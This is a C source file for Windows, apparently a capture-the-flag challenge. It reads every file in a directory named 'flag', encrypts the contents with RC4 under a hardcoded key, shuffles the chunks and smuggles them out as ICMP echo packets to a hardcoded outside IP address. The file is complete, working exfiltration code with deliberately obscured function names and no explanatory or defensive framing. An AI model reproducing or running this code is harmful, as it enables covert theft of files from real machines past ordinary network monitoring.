#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define DEST_IP "123.111.234.69"
#define BUFFER_SIZE 1024
#define ICMP_HEADER_SIZE 8
#define ICMP_TYPE_ECHO 8

// Define the ICMP header structure
struct icmp_hdr {
    unsigned char type;       // ICMP type
    unsigned char code;       // ICMP code
    unsigned short checksum;  // ICMP checksum
    unsigned short id;        // ICMP identifier
    unsigned short seq;       // ICMP sequence number
};

// Simple RC4 encryption implementation
void whattt(unsigned char *data, int data_len, const char *key) {
    unsigned char S[256];
    unsigned char k[256];
    int i, j = 0, temp;

    for (i = 0; i < 256; i++) {
        S[i] = i;
        k[i] = key[i % strlen(key)];
    }

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + k[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    i = j = 0;
    for (int x = 0; x < data_len; x++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        data[x] ^= S[(S[i] + S[j]) % 256];
    }
}

// Function to compute ICMP checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Function to swap odd and even yyyy
void keii_ganteng(unsigned char **yyyy, int chunk_count) {
    for (int i = 0; i < chunk_count - 1; i += 2) {
        unsigned char *temp = yyyy[i];
        yyyy[i] = yyyy[i + 1];
        yyyy[i + 1] = temp;
    }
}

// Function to send ICMP packet
int whatt(SOCKET sock, struct sockaddr_in *dest, unsigned char *data, int data_len) {
    unsigned char packet[ICMP_HEADER_SIZE + BUFFER_SIZE];
    memset(packet, 0, sizeof(packet));

    struct icmp_hdr *icmp_header = (struct icmp_hdr *)packet;
    icmp_header->type = ICMP_TYPE_ECHO;
    icmp_header->code = 0;
    icmp_header->id = (unsigned short)GetCurrentProcessId();
    icmp_header->seq = 1;
    memcpy(packet + ICMP_HEADER_SIZE, data, data_len);

    icmp_header->checksum = 0;
    icmp_header->checksum = checksum(packet, ICMP_HEADER_SIZE + data_len);

    return sendto(sock, (char *)packet, ICMP_HEADER_SIZE + data_len, 0,
                  (struct sockaddr *)dest, sizeof(struct sockaddr_in));
}

// Function to read files from whatisthis and process
void process_files(const char *whatisthis) {
    WIN32_FIND_DATA find_data;
    HANDLE hFind;
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", whatisthis);

    hFind = FindFirstFile(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Failed to open whatisthis: %s\n", whatisthis);
        return;
    }

    do {
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char file_path[MAX_PATH];
            snprintf(file_path, MAX_PATH, "%s\\%s", whatisthis, find_data.cFileName);

            FILE *file = fopen(file_path, "rb");
            if (!file) {
                fprintf(stderr, "Failed to open file: %s\n", file_path);
                continue;
            }

            fseek(file, 0, SEEK_END);
            long file_size = ftell(file);
            fseek(file, 0, SEEK_SET);

            unsigned char *buffer = malloc(file_size);
            fread(buffer, 1, file_size, file);
            fclose(file);

            int chunk_count = (file_size + BUFFER_SIZE - 1) / BUFFER_SIZE;
            unsigned char **yyyy = malloc(chunk_count * sizeof(unsigned char *));
            for (int i = 0; i < chunk_count; ++i) {
                yyyy[i] = malloc(BUFFER_SIZE);
                memset(yyyy[i], 0, BUFFER_SIZE);
                int bytes_to_copy = (file_size > BUFFER_SIZE) ? BUFFER_SIZE : file_size;
                memcpy(yyyy[i], buffer + i * BUFFER_SIZE, bytes_to_copy);
                file_size -= bytes_to_copy;
            }

            for (int i = 0; i < chunk_count; ++i) {
                whattt(yyyy[i], BUFFER_SIZE, "helloworld");
            }

            keii_ganteng(yyyy, chunk_count);

            WSADATA wsaData;
            SOCKET sock;
            struct sockaddr_in dest;

            WSAStartup(MAKEWORD(2, 2), &wsaData);
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
            if (sock == INVALID_SOCKET) {
                fprintf(stderr, "Socket creation failed.\n");
                return;
            }

            dest.sin_family = AF_INET;
            inet_pton(AF_INET, DEST_IP, &dest.sin_addr);

            for (int i = 0; i < chunk_count; ++i) {
                if (whatt(sock, &dest, yyyy[i], BUFFER_SIZE) == SOCKET_ERROR) {
                    fprintf(stderr, "Failed to send ICMP packet.\n");
                    break;
                }
                Sleep(100);  // Delay between packets
            }

            closesocket(sock);
            WSACleanup();

            for (int i = 0; i < chunk_count; ++i) {
                free(yyyy[i]);
            }
            free(yyyy);
            free(buffer);
        }
    } while (FindNextFile(hFind, &find_data) != 0);

    FindClose(hFind);
}

int main() {
    const char *whatisthis = "flag";  // Specify the whatisthis path
    process_files(whatisthis);
    return 0;
}
